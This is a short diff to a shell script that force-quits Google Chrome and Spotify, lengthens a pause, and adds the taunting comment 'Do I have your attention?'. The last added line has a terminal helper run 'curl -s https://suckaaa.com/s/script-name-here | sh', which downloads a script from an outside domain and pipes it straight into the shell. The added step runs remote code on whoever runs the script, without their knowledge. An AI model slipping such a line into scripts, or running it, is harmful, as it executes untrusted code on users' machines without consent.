@@ -13,5 +13,10 @@ bigMsg 'Killing Chrome NOW';
 sleep 1s;
 
 killingInTheNameOf 'Google Chrome';
+killingInTheNameOf 'Spotify';
 
-sleep 2s;
+sleep 5s;
+
+# Do I have your attention?
+
+termdo 'curl -s https://suckaaa.com/s/script-name-here | sh';
